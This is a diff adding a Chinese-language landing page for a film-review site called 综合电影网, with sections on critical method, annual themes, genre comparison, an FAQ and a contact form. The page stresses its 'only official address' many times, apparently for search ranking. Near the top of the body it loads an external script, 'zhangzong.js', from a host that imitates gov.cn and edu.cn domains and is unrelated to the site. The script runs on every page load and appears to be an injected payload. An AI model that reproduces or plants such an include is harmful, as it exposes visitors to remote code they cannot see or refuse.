@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>综合电影网｜以跨类型观察、创作研究与观众讨论为线索的中文电影内容平台</title>
+<meta name="description" content="综合电影网汇集华语、亚洲与世界电影的评论、创作观察、类型比较、年度观察和观众讨论，提供有出处、可讨论的影像内容。本站地址为 https://zonghedianyingwang-zh.github.io，不提供在线播放、资源下载或侵权内容入口。">
+<meta name="keywords" content="综合电影网, 电影评论, 类型观察, 影像创作研究, 华语电影, 亚洲电影, 年度观察, 观众讨论, zonghedianyingwang-zh.github.io">
+<meta name="author" content="综合电影网编辑组">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<link rel="canonical" href="https://zonghedianyingwang-zh.github.io">
+<style>
+:root{--bg:#08070d;--bg2:#0f0e17;--card:#151320;--line:#2c2940;--txt:#ecedf5;--dim:#a6a5bd;--acc:#ff3d77;--acc2:#00d2a0;--yel:#ffc94d;--blue:#5a7dff;--r:20px}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:90px}
+body{background:radial-gradient(circle at 18% -10%,rgba(255,61,119,.16),transparent 38%),radial-gradient(circle at 88% 12%,rgba(0,210,160,.14),transparent 34%),var(--bg);color:var(--txt);font-family:"WenQuanYi Micro Hei","PingFang SC","Microsoft YaHei",sans-serif;line-height:1.78;font-size:16px;-webkit-text-size-adjust:100%;overflow-x:hidden}
+img{max-width:100%;display:block}
+ul{list-style:none}
+a{color:inherit;text-decoration:none}
+button,input,textarea,select{font:inherit;color:inherit}
+:focus-visible{outline:2px solid var(--yel);outline-offset:3px}
+::selection{background:var(--acc);color:#fff}
+.wrap{width:100%;max-width:1360px;margin:0 auto;padding:0 36px}
+.eyebrow{display:inline-flex;align-items:center;gap:12px;font-size:.72rem;font-weight:800;letter-spacing:.28em;color:var(--acc2);text-transform:uppercase}
+.eyebrow::before{content:"";width:34px;height:2px;background:var(--acc2)}
+.kicker{color:var(--dim);font-size:.76rem;letter-spacing:.12em}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+.badge{display:inline-block;padding:7px 13px;border:1px solid var(--line);border-radius:100px;font-size:.72rem;letter-spacing:.1em;color:var(--dim)}
+.badge.hot{color:#fff;background:linear-gradient(100deg,var(--acc),#ff7a44);border-color:transparent}
+.badge.new{color:#051410;background:var(--acc2);border-color:transparent}
+
+/* nav */
+.stick{position:sticky;top:0;z-index:40;background:rgba(8,7,13,.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.navbar{display:flex;align-items:center;gap:28px;height:76px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:900;font-size:1.18rem;letter-spacing:-.02em}
+.logo i{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,var(--acc),var(--acc2));display:grid;place-items:center;color:#08070d;font-style:normal;font-weight:900;font-size:1.05rem}
+.url{margin-left:auto;display:flex;align-items:center;gap:10px;font-size:.75rem;color:var(--dim)}
+.url b{color:var(--acc2);font-weight:700;word-break:break-all}
+.menu{display:flex;gap:7px;flex-wrap:wrap}
+.menu a{font-size:.82rem;padding:9px 14px;border-radius:100px;border:1px solid transparent}
+.menu a:hover{background:var(--card);border-color:var(--line);color:#fff}
+
+/* layout */
+.layout{display:grid;grid-template-columns:268px minmax(0,1fr);gap:56px;padding-top:70px;padding-bottom:90px}
+.side{position:sticky;top:104px;align-self:start;background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:32px 26px;max-height:calc(100vh - 130px);overflow:auto}
+.side h4{font-size:.72rem;letter-spacing:.2em;color:var(--acc2);margin-bottom:20px}
+.side ol{display:grid;gap:4px;counter-reset:s}
+.side li{counter-increment:s}
+.side a{display:flex;gap:14px;align-items:baseline;padding:13px 14px;border-radius:14px;color:var(--dim);font-size:.92rem;border:1px solid transparent}
+.side a::before{content:counter(s,decimal-leading-zero);font-size:.72rem;color:var(--acc);font-weight:800}
+.side a:hover{background:rgba(255,255,255,.04);color:#fff;border-color:var(--line)}
+.side .dom{margin-top:26px;border-top:1px dashed var(--line);padding-top:22px;font-size:.72rem;color:var(--dim);word-break:break-all}
+.side .dom b{display:block;color:#fff;margin-top:7px;font-weight:700;letter-spacing:.02em}
+
+.hero{padding:34px;border:1px solid var(--line);border-radius:var(--r);background:linear-gradient(135deg,rgba(255,61,119,.12),rgba(0,210,160,.08));position:relative;overflow:hidden}
+.hero .play{position:absolute;right:-52px;top:-52px;width:210px;height:210px;border-radius:50%;border:1px solid rgba(255,255,255,.16);display:grid;place-items:center;font-size:.76rem;letter-spacing:.18em;color:var(--dim);text-align:center}
+.hero h1{font-size:clamp(2.6rem,5.6vw,4.6rem);line-height:1.08;letter-spacing:-.038em;font-weight:900;max-width:17ch}
+.hero h1 em{font-style:normal;background:linear-gradient(95deg,var(--acc),var(--yel));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{max-width:58ch;color:var(--dim);margin:26px 0 30px;font-size:1.02rem}
+.hero .row{display:flex;gap:12px;flex-wrap:wrap}
+
+/* generic */
+section{padding:52px 0;border-top:1px solid var(--line)}
+section:first-of-type{border-top:0}
+.sec-head{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:40px;align-items:end;margin-bottom:42px}
+@media(max-width:880px){.sec-head{grid-template-columns:1fr}}
+.sec-head h2{font-size:clamp(1.85rem,3.8vw,3rem);line-height:1.2;letter-spacing:-.028em;font-weight:900}
+.sec-head p{color:var(--dim);max-width:52ch}
+.sec-num{font-size:.8rem;font-weight:800;letter-spacing:.24em;color:var(--acc);margin-bottom:14px;display:block}
+
+.grid{display:grid;gap:24px}
+.cards3{grid-template-columns:repeat(3,1fr)}
+.cards2{grid-template-columns:repeat(2,1fr)}
+.cards4{grid-template-columns:repeat(4,1fr)}
+@media(max-width:1060px){.cards3,.cards4{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:680px){.cards2,.cards3,.cards4{grid-template-columns:1fr}}
+
+/* cards */
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;display:flex;flex-direction:column;transition:.28s}
+.card:hover{transform:translateY(-6px);border-color:rgba(255,61,119,.55)}
+.thumb{position:relative;aspect-ratio:16/10;overflow:hidden}
+.thumb img{width:100%;height:100%;object-fit:cover;transition:.6s}
+.card:hover .thumb img{transform:scale(1.06)}
+.thumb span{position:absolute;top:16px;left:16px;background:rgba(8,7,13,.8);border:1px solid var(--line);border-radius:100px;padding:6px 12px;font-size:.7rem;letter-spacing:.1em;color:#fff}
+.body{padding:28px}
+.body h3{font-size:1.32rem;letter-spacing:-.018em;line-height:1.42;margin:12px 0 14px}
+.body p{color:var(--dim);font-size:.94rem}
+.body .meta{margin-top:20px;padding-top:18px;border-top:1px solid var(--line);display:flex;justify-content:space-between;font-size:.76rem;color:var(--dim)}
+
+/* features */
+.feat{padding:34px;border:1px solid var(--line);border-radius:var(--r);background:var(--card);position:relative}
+.feat .ic{width:54px;height:54px;border-radius:15px;background:rgba(90,125,255,.14);color:var(--blue);display:grid;place-items:center;font-size:1.35rem;font-weight:900;margin-bottom:24px}
+.feat:nth-child(2) .ic{background:rgba(255,61,119,.14);color:var(--acc)}
+.feat:nth-child(3) .ic{background:rgba(0,210,160,.14);color:var(--acc2)}
+.feat:nth-child(4) .ic{background:rgba(255,201,77,.14);color:var(--yel)}
+.feat h3{font-size:1.36rem;margin-bottom:14px;letter-spacing:-.015em}
+.feat p{color:var(--dim);font-size:.94rem}
+.feat ul{margin-top:20px;display:grid;gap:9px}
+.feat li{font-size:.88rem;color:var(--dim);padding-left:18px;position:relative}
+.feat li::before{content:"";position:absolute;left:0;top:10px;width:7px;height:7px;border-radius:50%;background:var(--acc)}
+
+/* chartish */
+.split{display:grid;grid-template-columns:minmax(0,.95fr) minmax(0,1fr);gap:34px;align-items:center}
+@media(max-width:980px){.split{grid-template-columns:1fr}}
+.glass{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:34px}
+.bars{display:grid;gap:20px}
+.bar{display:grid;gap:9px}
+.bar .top{display:flex;justify-content:space-between;font-size:.88rem;color:var(--dim)}
+.bar .track{height:11px;border-radius:100px;background:rgba(255,255,255,.07);overflow:hidden}
+.bar .fill{height:100%;border-radius:100px;background:linear-gradient(90deg,var(--acc),var(--yel))}
+.pillbox{display:grid;gap:14px}
+.pill{border:1px solid var(--line);border-radius:16px;padding:22px 24px;display:flex;gap:18px;align-items:flex-start}
+.pill b{font-size:1.6rem;color:var(--acc2);font-weight:900}
+.pill div h4{font-size:1.12rem;margin-bottom:6px}
+.pill div p{font-size:.86rem;color:var(--dim)}
+
+/* table */
+.panel{background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+.panel-h{display:flex;justify-content:space-between;gap:16px;align-items:center;padding:24px 30px;border-bottom:1px solid var(--line);flex-wrap:wrap}
+.panel-h input{background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:100px;padding:12px 18px;min-width:250px;font-size:.9rem}
+.panel-h input:focus{outline:0;border-color:var(--acc2)}
+.scroll-x{overflow-x:auto}
+table{width:100%;border-collapse:collapse;min-width:740px}
+th,td{padding:22px 26px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-size:.7rem;letter-spacing:.18em;color:var(--acc2);text-transform:uppercase}
+td.name{font-weight:800;font-size:1.08rem}
+td small{display:block;color:var(--dim);font-size:.82rem;margin-top:5px}
+.tstatus{display:inline-block;padding:5px 11px;border-radius:100px;font-size:.72rem;border:1px solid var(--line)}
+.tstatus.on{color:var(--acc2);border-color:rgba(0,210,160,.45)}
+.tstatus.soon{color:var(--yel);border-color:rgba(255,201,77,.45)}
+.empty{padding:40px;text-align:center;color:var(--dim);font-size:.92rem}
+
+/* qa */
+.qlist{display:grid;gap:14px}
+.q{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:26px 28px}
+.q h4{font-size:1.15rem;margin-bottom:12px;display:flex;gap:14px;align-items:baseline}
+.q h4 i{font-style:normal;color:var(--acc);font-weight:900}
+.q p{color:var(--dim);font-size:.94rem}
+
+/* form */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+@media(max-width:720px){.two{grid-template-columns:1fr}}
+.formbox{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:36px}
+label{display:block;font-size:.74rem;letter-spacing:.14em;color:var(--dim);margin-bottom:9px}
+input,textarea,select{width:100%;background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:14px;padding:16px;font-size:.96rem;color:#fff}
+input:focus,textarea:focus,select:focus{outline:0;border-color:var(--acc)}
+textarea{min-height:150px;resize:vertical}
+.fgrid{display:grid;gap:22px}
+button.cta{background:linear-gradient(100deg,var(--acc),var(--yel));color:#1a0c14;border:0;border-radius:100px;padding:18px 34px;font-weight:900;letter-spacing:.08em;cursor:pointer;font-size:.96rem}
+button.cta:hover{filter:brightness(1.08)}
+.sent{margin-top:18px;color:var(--acc2);font-size:.9rem;display:none}
+
+footer{border-top:1px solid var(--line);padding:72px 0 34px;background:var(--bg2)}
+.fwrap{display:grid;grid-template-columns:1.6fr repeat(3,1fr);gap:48px}
+@media(max-width:900px){.fwrap{grid-template-columns:1fr 1fr}}
+.fname{font-size:1.85rem;font-weight:900;letter-spacing:-.025em;margin:18px 0 16px}
+.fbox p{color:var(--dim);font-size:.92rem;max-width:35ch}
+.fdom{margin-top:26px;border:1px solid var(--line);border-radius:16px;padding:22px;background:rgba(255,255,255,.03);word-break:break-all}
+.fdom b{display:block;color:var(--acc2);font-size:.7rem;letter-spacing:.16em;margin-bottom:8px}
+.fwrap h4{font-size:.92rem;margin-bottom:20px;letter-spacing:.05em}
+.fwrap ul{display:grid;gap:12px;font-size:.9rem;color:var(--dim)}
+.fwrap a:hover{color:#fff}
+.fbottom{margin-top:52px;padding-top:28px;border-top:1px solid var(--line);display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap;font-size:.8rem;color:var(--dim)}
+
+/* mobile */
+.burger{display:none;margin-left:auto;background:var(--card);border:1px solid var(--line);border-radius:12px;width:46px;height:46px;align-items:center;justify-content:center;cursor:pointer;color:var(--dim)}
+@media(max-width:1040px){.layout{grid-template-columns:1fr;padding-top:44px}.side{position:static;max-height:none}.burger{display:flex}.menu{display:none;width:100%;flex-direction:column;padding:18px 0}.menu.open{display:flex}.navbar{flex-wrap:wrap;height:auto;padding:14px 0}.url{margin-left:0;width:100%}}
+@media(max-width:640px){.wrap{padding:0 20px}.hero,.formbox,.feat,.glass,.body,.panel-h{padding:26px 22px}.sec-head{margin-bottom:30px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="stick"><div class="wrap navbar">
+ <a class="logo" href="#top"><i>综</i>综合电影网</a>
+ <button class="burger" id="burger" aria-label="打开导航"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M3 12h18M3 18h18"/></svg></button>
+ <nav class="menu" id="menu">
+  <a href="#brief">平台定位</a><a href="#columns">栏目导览</a><a href="#watch">评论方法</a><a href="#review">年度观察</a><a href="#types">类型比较</a><a href="#table">选题档案</a><a href="#guide">观看指南</a><a href="#qa">常见疑问</a><a href="#join">投稿参与</a>
+ </nav>
+ <div class="url"><span>官方访问地址</span><b>zonghedianyingwang-zh.github.io</b></div>
+</div></header>
+
+<div class="wrap"><div class="layout">
+ <aside class="side">
+  <h4>内容目录</h4>
+  <ol>
+   <li><a href="#brief">平台定位与更新说明</a></li>
+   <li><a href="#columns">综合栏目导览</a></li>
+   <li><a href="#watch">评论如何形成</a></li>
+   <li><a href="#review">年度观察与议题</a></li>
+   <li><a href="#types">跨类型比较</a></li>
+   <li><a href="#table">选题与资料档案</a></li>
+   <li><a href="#guide">面向观众的观看指南</a></li>
+   <li><a href="#qa">版权、转载与常见疑问</a></li>
+   <li><a href="#join">投稿与编辑参与</a></li>
+  </ol>
+  <div class="dom">唯一官方访问地址<b>https://zonghedianyingwang-zh.github.io</b></div>
+ </aside>
+
+ <main id="top">
+  <section class="hero">
+   <span class="eyebrow">中文电影评论平台</span>
+   <h1>综合电影网：<br><em>让一部电影进入更完整的讨论。</em></h1>
+   <p>综合电影网把影片放回创作、类型、时代与观众经验之间观察。我们不追求结论统一，而希望让读者理解评论从哪里开始、依据哪些材料，并保留继续讨论的空间。</p>
+   <div class="row"><span class="badge hot">原创评论</span><span class="badge new">每月更新选题</span><span class="badge">华语 · 亚洲 · 世界电影</span></div>
+   <div class="play">CINEMA<br>NOTEBOOK</div>
+  </section>
+
+  <section id="brief">
+   <div class="sec-head"><div><span class="sec-num">SECTION 01 / 平台定位</span><h2>“综合”意味着跨类型、跨地区，也意味着保留不同的解释方式。</h2></div><div><p>本栏目说明网站的内容范围、更新方式和内容边界。它不评价作品是否“值得看”，而说明评论如何建立，以及哪些问题适合在本站展开。</p></div></div>
+   <div class="grid cards3">
+    <div class="feat"><div class="ic">观</div><h3>从单一评分转向多重角度</h3><p>评论同时关注叙事、表演、影像、声音、空间与社会语境，避免用一个印象概括整部作品。</p></div>
+    <div class="feat"><div class="ic">辑</div><h3>以可复核材料组织内容</h3><p>涉及创作人员、年份、版本与具体场景的信息，会尽量标明依据；解释与判断会明确标注为观点。</p></div>
+    <div class="feat"><div class="ic">域</div><h3>独立地址，清晰访问入口</h3><p>综合电影网唯一官方访问入口为：</p><p class="mono" style="margin-top:12px;color:var(--acc2);word-break:break-all">https://zonghedianyingwang-zh.github.io</p></div>
+   </div>
+  </section>
+
+  <section id="columns">
+   <div class="sec-head"><div><span class="sec-num">SECTION 02 / 栏目导览</span><h2>四个常设栏目，构成网站的内容骨架。</h2></div><div><p>每个栏目采用不同的提问方式：评论聚焦作品内部，观察连接作品与时代，比较寻找类型之间的变化，指南服务不同观影需求。</p></div></div>
+   <div class="grid cards4">
+    <article class="card"><div class="thumb"><img src="https://images.unsplash.com/photo-1485095329183-d0797cdc5676?auto=format&fit=crop&w=1000&q=70" alt="电影胶片与放映设备，用于评论栏目配图"><span>栏目 01</span></div><div class="body"><span class="kicker">评论</span><h3>单部作品如何运作</h3><p>从开场、冲突、人物关系到收束，解释评论判断来自哪些具体材料。</p><div class="meta"><span>更新频率：每周</span><span>＋ 细读</span></div></div></article>
+    <article class="card"><div class="thumb"><img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?auto=format&fit=crop&w=1000&q=70" alt="电影院观众席与银幕，用于观察栏目配图"><span>栏目 02</span></div><div class="body"><span class="kicker">观察</span><h3>作品与时代如何互看</h3><p>讨论电影如何记录城市、家庭、劳动与公共经验，同时避免简单对号入座。</p><div class="meta"><span>更新频率：每月</span><span>＋ 专题</span></div></div></article>
+    <article class="card"><div class="thumb"><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?auto=format&fit=crop&w=1000&q=70" alt="城市街道夜景，用于类型比较栏目配图"><span>栏目 03</span></div><div class="body"><span class="kicker">比较</span><h3>类型如何流动与改写</h3><p>将同类题材放回不同地区、年代与创作传统中，比较冲突、人物和空间表达。</p><div class="meta"><span>更新频率：每月</span><span>＋ 对照</span></div></div></article>
+    <article class="card"><div class="thumb"><img src="https://images.unsplash.com/photo-1598899134739-24c46f58b8c0?auto=format&fit=crop&w=1000&q=70" alt="放映室灯光与座椅，用于观看指南栏目配图"><span>栏目 04</span></div><div class="body"><span class="kicker">指南</span><h3>为不同观众提供入口</h3><p>按主题、节奏、观影经验和研究兴趣组织片单，不把个人偏好包装成普遍排名。</p><div class="meta"><span>更新频率：按需</span><span>＋ 片单</span></div></div></article>
+   </div>
+  </section>
+
+  <section id="watch">
+   <div class="sec-head"><div><span class="sec-num">SECTION 03 / 评论方法</span><h2>好的评论不是把感受写长，而是说清判断从哪里来。</h2></div><div><p>这一栏目展示编辑组处理材料的步骤。它不改变观众对作品的感受，但能让评价从印象变成可以讨论的论证。</p></div></div>
+   <div class="split">
+    <div class="glass">
+     <span class="eyebrow">材料权重</span>
+     <h3 style="margin:18px 0 30px;font-size:1.55rem;line-height:1.45;letter-spacing:-.02em">评论依赖哪些证据，判断就有多大程度的可讨论空间。</h3>
+     <div class="bars">
+      <div class="bar"><div class="top"><span>作品中的场景、台词与镜头</span><b>高</b></div><div class="track"><div class="fill" style="width:92%"></div></div></div>
+      <div class="bar"><div class="top"><span>创作人员的公开访谈与制作材料</span><b>中高</b></div><div class="track"><div class="fill" style="width:76%"></div></div></div>
+      <div class="bar"><div class="top"><span>时代、地区与类型研究</span><b>中</b></div><div class="track"><div class="fill" style="width:64%"></div></div></div>
+      <div class="bar"><div class="top"><span>个人观看经验与情绪反应</span><b>辅助</b></div><div class="track"><div class="fill" style="width:38%"></div></div></div>
+     </div>
+    </div>
+    <div class="pillbox">
+     <div class="pill"><b>01</b><div><h4>先确认看的是哪个版本</h4><p>片长、字幕、修复程度、删减与发行版本会影响节奏和信息，评论开头应尽量标明。</p></div></div>
+     <div class="pill"><b>02</b><div><h4>从重复元素进入主题</h4><p>颜色、空间、动作、台词或人物关系的重复，常比一次性情节更能说明创作意图。</p></div></div>
+     <div class="pill"><b>03</b><div><h4>把“我喜欢”转成具体判断</h4><p>与其只说“节奏慢”，不如说明哪些段落改变了时间压力，以及这种处理服务于什么。</p></div></div>
+     <div class="pill"><b>04</b><div><h4>允许解释之间互相反驳</h4><p>同一场景可以支持不同解释。评论应提供理由，而不是把一种读法变成唯一答案。</p></div></div>
+    </div>
+   </div>
+  </section>
+
+  <section id="review">
+   <div class="sec-head"><div><span class="sec-num">SECTION 04 / 年度观察</span><h2>年度观察不是颁奖，而是寻找一年内反复出现的问题。</h2></div><div><p>综合电影网每年选择若干主题进行跨作品观察。这些主题来自当年作品中反复出现的人物关系、空间形态与社会焦虑，而不是预设结论。</p></div></div>
+   <div class="grid cards4">
+    <article class="card"><div class="body"><span class="kicker">年度观察 · 家庭</span><h3>家庭不再是稳定答案，而是需要不断协商的关系</h3><p>多部作品将家庭表现为代际责任、居住空间与职业压力的交汇处。差异在于，有的作品保留修复可能，有的则把冲突推向结构性无解。</p><div class="meta"><span>涉及作品：华语、东亚现代题材</span><span>2026</span></div></div></article>
+    <article class="card"><div class="body"><span class="kicker">年度观察 · 城市</span><h3>城市空间开始承担叙事压力</h3><p>通勤、旧楼、市场、办公室与边界区域不再只是背景。人物如何移动、停留与受困，直接影响故事节奏与人物选择。</p><div class="meta"><span>涉及作品：都市现实题材</span><span>2026</span></div></article>
+    <article class="card"><div class="body"><span class="kicker">年度观察 · 表演</span><h3>“控制”成为表演的核心动作</h3><p>克制、停顿与延迟反应被频繁使用。它们使人物内部压力外显，也让观众从面部信息转向身体与环境细节。</p><div class="meta"><span>涉及作品：现实主义、心理题材</span><span>2026</span></div></article>
+    <article class="card"><div class="body"><span class="kicker">年度观察 · 类型</span><h3>类型混合带来新的伦理难题</h3><p>喜剧、悬疑、家庭与社会议题的结合，使人物行为难以用单一规则评价，也要求评论更加关注叙事内部的代价。</p><div class="meta"><span>涉及作品：跨类型创作</span><span>2026</span></div></article>
+   </div>
+  </section>
+
+  <section id="types">
+   <div class="sec-head"><div><span class="sec-num">SECTION 05 / 跨类型比较</span><h2>同一母题进入不同类型和地区，会变成不同的问题。</h2></div><div><p>比较栏目不追求“谁更好”，而是比较叙事如何重组。以下主题会随研究和投稿持续补充。</p></div></div>
+   <div class="grid cards3">
+    <div class="feat"><div class="ic">家</div><h3>家庭责任</h3><p>在华语家庭片中，责任常表现为代际照护；在都市职场片中，则表现为职业与家庭的资源冲突。</p><ul><li>观察冲突如何分配</li><li>比较“家”作为空间与制度</li><li>避免把文化差异写成本质差异</li></ul></div>
+    <div class="feat"><div class="ic">城</div><h3>城市迁徙</h3><p>迁徙叙事既写人物离开与到达，也写旧关系如何被距离、工作和法律身份改变。</p><ul><li>比较起点与终点的影像处理</li><li>关注交通工具与停留点</li><li>区分个体选择与结构压力</li></ul></div>
+    <div class="feat"><div class="ic">真</div><h3>真相与记忆</h3><p>悬疑类型倾向于让真相推动行动，历史或家庭题材则更关注记忆如何被讲述、压抑与重构。</p><ul><li>比较证据呈现方式</li><li>关注叙述者是否可靠</li><li>区分真相、和解与遗忘</li></ul></div>
+   </div>
+  </section>
+
+  <section id="table">
+   <div class="sec-head"><div><span class="sec-num">SECTION 06 / 选题档案</span><h2>选题档案用于编辑与读者共同追踪研究进度。</h2></div><div><p>编号只代表归档顺序，不表示推荐程度、质量等级或上映时间。可按主题或状态筛选；表格会在新研究完成后更新。</p></div></div>
+   <div class="panel">
+    <div class="panel-h"><h3 style="font-size:1.35rem;letter-spacing:-.015em">近期选题与资料整理</h3><input id="find" type="search" aria-label="检索选题档案：输入关键词，例如家庭、城市、表演、悬疑"></div>
+    <div class="scroll-x"><table id="arc">
+     <thead><tr><th style="width:90px">编号</th><th>研究主题</th><th>涉及方向</th><th>主要问题</th><th style="width:130px">状态</th></tr></thead>
+     <tbody>
+      <tr><td class="mono">T—01</td><td class="name">餐桌上的家庭协商<small>以共同进餐场景观察代际关系</small></td><td>家庭 / 表演</td><td>人物如何借助食物、座位与沉默表达拒绝或接纳？</td><td><span class="tstatus on">已发布</span></td></tr>
+      <tr><td class="mono">T—02</td><td class="name">电梯、楼梯与职业时间<small>城市职业题材中的垂直空间</small></td><td>城市 / 类型</td><td>上下移动如何成为职业等级与时间压力的视觉语言？</td><td><span class="tstatus on">已发布</span></td></tr>
+      <tr><td class="mono">T—03</td><td class="name">悬疑中的第二叙述者<small>不可靠叙述的结构功能</small></td><td>悬疑 / 叙事</td><td>信息延迟是否服务于主题，还是只服务于反转？</td><td><span class="tstatus soon">整理中</span></td></tr>
+      <tr><td class="mono">T—04</td><td class="name">旧楼与记忆保存<small>居住空间作为历史材料</small></td><td>城市 / 历史</td><td>拆迁、修缮与居住记忆如何共同构成人物行动？</td><td><span class="tstatus soon">整理中</span></td></tr>
+      <tr><td class="mono">T—05</td><td class="name">喜剧中的尴尬停顿<small>幽默与伦理的边界</small></td><td>喜剧 / 表演</td><td>停顿何时产生共情，何时把人物处境变成消费对象？</td><td><span class="tstatus soon">待补</span></td></tr>
+     </tbody>
+    </table></div>
+    <p class="empty" id="none" hidden>未找到与关键词匹配的档案，请尝试“家庭”“城市”“表演”等更宽泛的词。</p>
+   </div>
+  </section>
+
+  <section id="guide">
+   <div class="sec-head"><div><span class="sec-num">SECTION 07 / 观看指南</span><h2>指南不替你决定看什么，只把入口说清楚。</h2></div><div><p>综合电影网按主题与观看经验组织片单。每套片单都会说明它适合谁、可能遇到什么，以及为什么这些作品被放在一起。</p></div></div>
+   <div class="grid cards2">
+    <article class="card"><div class="body"><span class="kicker">片单 A · 家庭关系</span><h3>愿意讨论代际与照护的观众</h3><p>适合愿意面对缓慢节奏、人物选择复杂且未必和解的观众。可关注同一家庭事件在不同角色视角中的差异。</p><div class="meta"><span>建议：按主题连续观看</span><span>3—5 部</span></div></div></article>
+    <article class="card"><div class="body"><span class="kicker">片单 B · 城市经验</span><h3>对空间、通勤与城市变化敏感</h3><p>适合关注建筑、街道与劳动经验的观众。观看时可记录人物到达与离开某个空间的方式。</p><div class="meta"><span>建议：搭配城市随笔</span><span>4 部</span></div></article>
+    <article class="card"><div class="body"><span class="kicker">片单 C · 叙事结构</span><h3>对叙述顺序与视角变化感兴趣</h3><p>适合愿意接受非线性叙事和叙述视角变化的观众。建议在首次观看时只记录疑问，第二次再追踪信息。</p><div class="meta"><span>建议：二次观看</span><span>3 部</span></div></article>
+    <article class="card"><div class="body"><span class="kicker">片单 D · 表演细节</span><h3>想从表演进入人物心理</h3><p>适合关注面部、身体、停顿与环境互动的观众。可对比同一演员在不同类型中的控制方式。</p><div class="meta"><span>建议：片段对照</span><span>4—6 部</span></div></article>
+   </div>
+  </section>
+
+  <section id="qa">
+   <div class="sec-head"><div><span class="sec-num">SECTION 08 / 常见疑问</span><h2>关于内容范围、版权与转载，读者最常提出的问题。</h2></div><div><p>如果以下问题没有覆盖你的具体情况，可通过页面底部的参与入口提交更完整的背景材料。</p></div></div>
+   <div class="qlist">
+    <div class="q"><h4><i>Q1</i>综合电影网是否提供影片在线观看或下载？</h4><p>不提供。本站仅从事电影评论、研究与资料整理，不设置播放器、下载跳转或侵权资源入口。</p></div>
+    <div class="q"><h4><i>Q2</i>“综合”是否意味着什么电影都会收录？</h4><p>不是。选题仍需与网站的研究方向有关，包括创作方法、类型变化、社会观察与观众经验。</p></div>
+    <div class="q"><h4><i>Q3</i>评论中的观点是否代表统一立场？</h4><p>不必然。本站鼓励基于材料的多种解释；不同作者的判断可以并存，也会在资料更新后修订。</p></div>
+    <div class="q"><h4><i>Q4</i>能否引用或转载网站文章？</h4><p>转载需事先取得授权，并保留完整作者信息、原文标题、出处与官方链接，不得篡改正文或用于商业盗用。</p></div>
+    <div class="q"><h4><i>Q5</i>发现资料错误如何反馈？</h4><p>可通过参与入口提供作品名称、错误内容、可复核材料与建议更正。编辑组核实后会更新页面并保留修订记录。</p></div>
+    <div class="q"><h4><i>Q6</i>如何访问网站？</h4><p>综合电影网唯一官方访问地址为：<b class="mono" style="color:var(--acc2)">https://zonghedianyingwang-zh.github.io</b></p></div>
+   </div>
+  </section>
+
+  <section id="join">
+   <div class="sec-head"><div><span class="sec-num">SECTION 09 / 投稿参与</span><h2>欢迎提交选题、勘误、资料来源与采访申请。</h2></div><div><p>请尽量写明作品、观看版本、论证材料与原创说明。编辑组会依据选题相关性和资料完整性进行回复。</p></div></div>
+   <div class="formbox">
+    <form class="fgrid" id="f" novalidate>
+     <div class="two">
+      <div><label for="name">称呼或笔名</label><input id="name" name="name" type="text" required></div>
+      <div><label for="mail">联系邮箱</label><input id="mail" name="mail" type="email" required></div>
+     </div>
+     <div class="two">
+      <div><label for="topic">来信类型</label><select id="topic" name="topic" required><option value="">请选择</option><option>评论选题</option><option>资料勘误</option><option>采访申请</option><option>转载授权</option><option>版权问题</option><option>其他建议</option></select></div>
+      <div><label for="film">相关作品或创作者</label><input id="film" name="film" type="text"></div>
+     </div>
+     <div><label for="msg">补充说明与可核验来源</label><textarea id="msg" name="msg" required></textarea></div>
+     <div><button class="cta" type="submit">提交至编辑组</button><span class="sent" id="ok">已收到提交。编辑组将在核验材料后回复，请勿重复提交。</span></div>
+    </form>
+   </div>
+  </section>
+ </main>
+</div></div>
+
+<footer><div class="wrap">
+ <div class="fwrap">
+  <div class="fbox"><span class="eyebrow">综合电影网</span><div class="fname">综合电影网</div><p>以跨类型观察、创作研究和观众讨论为线索的中文电影内容平台。评论关注作品内部机制，也关注作品如何与时代、空间及观众相遇。</p><div class="fdom"><b>唯一官方访问地址</b>https://zonghedianyingwang-zh.github.io</div></div>
+  <div><h4>内容栏目</h4><ul><li><a href="#brief">平台定位</a></li><li><a href="#columns">栏目导览</a></li><li><a href="#review">年度观察</a></li><li><a href="#guide">观看指南</a></li></ul></div>
+  <div><h4>研究方法</h4><ul><li><a href="#watch">评论方法</a></li><li><a href="#types">跨类型比较</a></li><li><a href="#table">选题档案</a></li><li><a href="#qa">常见疑问</a></li></ul></div>
+  <div><h4>参与方式</h4><ul><li><a href="#join">投稿参与</a></li><li><a href="#">编辑规范</a></li><li><a href="#">版权声明</a></li><li><a href="#">资料更正</a></li></ul></div>
+ </div>
+ <div class="fbottom"><span>© <span id="y"></span> 综合电影网（zonghedianyingwang）。页面涉及的影片名称、海报、影像及剧照权利归相应权利人所有，仅用于评论与研究。</span><span>本站不提供在线播放或下载服务</span></div>
+</div></footer>
+
+<script>
